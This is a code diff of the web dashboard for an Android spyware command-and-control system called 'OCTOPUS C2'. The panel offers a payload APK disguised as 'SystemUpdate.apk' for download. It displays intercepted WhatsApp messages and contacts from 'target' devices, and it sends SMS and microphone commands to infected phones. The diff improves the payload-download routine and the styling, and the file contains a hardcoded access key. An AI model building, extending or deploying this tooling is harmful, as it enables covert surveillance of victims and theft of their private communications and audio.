@@ -2,32 +2,42 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OCTOPUS | COMMAND CENTER</title>
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&family=Syncopate:wght@700&display=swap');
         :root { --red: #ff1a1a; --bg: #000; --panel: #080808; --border: #1a1a1a; }
         body { margin: 0; background: var(--bg); color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; height: 100vh; overflow: hidden; }
+        
         #login-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
         .login-card { width: 100%; max-width: 380px; padding: 40px; background: #050505; border: 1px solid var(--border); border-radius: 40px; text-align: center; }
         input { width: 100%; background: #000; border: 1px solid #111; padding: 15px; border-radius: 15px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box; }
-        .login-btn { width: 100%; padding: 15px; border-radius: 30px; border: none; background: #fff; color: #000; font-family: 'Syncopate'; font-size: 10px; cursor: pointer; }
+        .login-btn { width: 100%; padding: 15px; border-radius: 30px; border: none; background: #fff; color: #000; font-family: 'Syncopate'; font-size: 10px; cursor: pointer; transition: 0.3s; }
+        .login-btn:hover { background: var(--red); color: #fff; }
+
         nav { width: 280px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 30px 0; }
-        .nav-link { padding: 18px 35px; color: #555; text-decoration: none; font-size: 12px; text-transform: uppercase; border-left: 3px solid transparent; cursor: pointer; }
-        .nav-link.active { color: #fff; border-left: 3px solid var(--red); }
+        .nav-link { padding: 18px 35px; color: #555; text-decoration: none; font-size: 12px; text-transform: uppercase; border-left: 3px solid transparent; cursor: pointer; transition: 0.3s; }
+        .nav-link.active, .nav-link:hover { color: #fff; border-left: 3px solid var(--red); background: rgba(255,0,0,0.02); }
+
         main { flex: 1; padding: 40px; overflow-y: auto; background: radial-gradient(circle at top right, #1a0000, #000); }
+        header { display: flex; justify-content: space-between; border-bottom: 1px solid #222; padding-bottom: 20px; margin-bottom: 30px; }
+        
         #target-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
-        .card { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 25px; padding: 25px; margin-bottom: 15px; }
-        .intel-log { background: rgba(255,255,255,0.03); border-left: 2px solid var(--red); padding: 12px; margin-bottom: 10px; font-size: 13px; }
+        .card { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 25px; padding: 25px; transition: 0.4s; }
+        .intel-log { background: rgba(255,255,255,0.03); border-left: 2px solid var(--red); padding: 12px; margin-bottom: 10px; font-size: 13px; border-radius: 0 10px 10px 0; animation: slideIn 0.3s ease; }
         .cmd-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
-        .cmd-btn { background: #111; border: 1px solid #222; color: #fff; padding: 8px; border-radius: 8px; font-size: 9px; cursor: pointer; }
+        .cmd-btn { background: #111; border: 1px solid #222; color: #fff; padding: 8px; border-radius: 8px; font-size: 9px; cursor: pointer; transition: 0.2s; }
+        .cmd-btn:hover { background: var(--red); }
+        
+        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
     </style>
 </head>
 <body>
 
     <div id="login-overlay">
         <div class="login-card">
-            <h1 style="font-family:'Syncopate'; color:var(--red); font-size:18px;">OCTOPUS C2</h1>
+            <h1 style="font-family:'Syncopate'; color:var(--red); font-size: 18px; letter-spacing: 5px;">OCTOPUS C2</h1>
             <input type="password" id="pass" placeholder="MASTER KEY">
             <button class="login-btn" onclick="login()">INITIALIZE SESSION</button>
         </div>
@@ -36,14 +46,15 @@
     <nav id="sidebar" style="display:none;">
         <div style="text-align: center; margin-bottom: 40px; font-family:'Syncopate'; color:var(--red); font-size: 20px;">OCTOPUS</div>
         <div class="nav-link active">Live Control</div>
-        <div class="nav-link" onclick="downloadAPK()" style="color:var(--red)">Build/Download APK</div>
+        <div class="nav-link" onclick="downloadAPK()" style="color:var(--red)">Build & Download APK</div>
     </nav>
 
     <main id="main-content" style="display:none;">
-        <header style="display: flex; justify-content: space-between; border-bottom: 1px solid #222; padding-bottom: 20px; margin-bottom: 30px;">
+        <header>
             <h1 style="font-family: 'Syncopate'; font-size: 18px;">COMMAND CENTER</h1>
-            <div id="status" style="font-size: 10px; color: #444;">LINKING...</div>
+            <div id="status" style="font-size: 10px; color: #444; text-transform: uppercase; letter-spacing: 2px;">LINKING TO CORE...</div>
         </header>
+
         <div id="target-container"></div>
     </main>
 
@@ -60,18 +71,33 @@
             } else { alert("ACCESS DENIED"); }
         }
 
-        // FIXED: Force download even on HTTPS Netlify
-        function downloadAPK() {
-            const link = document.createElement('a');
-            link.href = SERVER_URL + "/download/SystemUpdate.apk";
-            link.download = "SystemUpdate.apk";
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
+        async function downloadAPK() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = "FETCHING PAYLOAD...";
+            statusDiv.style.color = "var(--red)";
+
+            try {
+                const response = await fetch(`${SERVER_URL}/download/SystemUpdate.apk`);
+                if (!response.ok) throw new Error('Download failed');
+                const blob = await response.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = "SystemUpdate.apk";
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                statusDiv.innerText = "PAYLOAD DELIVERED";
+                statusDiv.style.color = "#0f0";
+            } catch (err) {
+                window.open(`${SERVER_URL}/download/SystemUpdate.apk`, '_blank');
+                statusDiv.innerText = "FALLBACK DOWNLOAD TRIGGERED";
+            }
         }
 
         function startC2() {
             socket = io(SERVER_URL, { query: { type: 'mastermind', key: 'octopus_xx1' } });
+            
             socket.on('connect', () => {
                 document.getElementById('status').innerText = "CORE ONLINE";
                 document.getElementById('status').style.color = "#0f0";
@@ -79,13 +105,18 @@
 
             socket.on('update_dashboard', (res) => {
                 let grid = document.getElementById('target-container');
+                
+                // WHATSAPP LOGIC
                 if (res.data.type === 'wa_message' || res.data.type === 'wa_contact') {
                     const log = document.createElement('div');
                     log.className = 'intel-log';
-                    log.innerHTML = `<span style="color:var(--red)">[INTEL]:</span> ${res.data.msg || res.data.name}`;
+                    const label = res.data.type === 'wa_contact' ? 'TARGET_ACTIVE' : 'MSG_IN';
+                    log.innerHTML = `<b style="color:var(--red)">[${label}]</b> ${res.data.msg || res.data.name}`;
                     grid.prepend(log);
                     return;
                 }
+
+                // DEVICE CARD LOGIC
                 let card = document.getElementById(res.id);
                 if(!card) {
                     card = document.createElement('div');
@@ -95,7 +126,7 @@
                 }
                 card.innerHTML = `
                     <div style="font-size: 9px; color: #0f0;">● ONLINE | ${res.id}</div>
-                    <div style="font-size: 18px; font-weight:700; margin: 10px 0;">${res.data.model || 'Target'}</div>
+                    <div style="font-size: 18px; font-weight:700; margin: 10px 0;">${res.data.model || 'Target Device'}</div>
                     <div class="cmd-grid">
                         <button class="cmd-btn" onclick="send('${res.id}', 'sms')">SMS</button>
                         <button class="cmd-btn" onclick="send('${res.id}', 'mic')">MIC</button>
@@ -104,7 +135,10 @@
             });
         }
 
-        function send(id, act) { socket.emit('run_action', { targetId: id, action: act }); }
+        function send(id, act) { 
+            socket.emit('run_action', { targetId: id, action: act }); 
+            alert("COMMAND DISPATCHED: " + act.toUpperCase());
+        }
     </script>
 </body>
 </html>
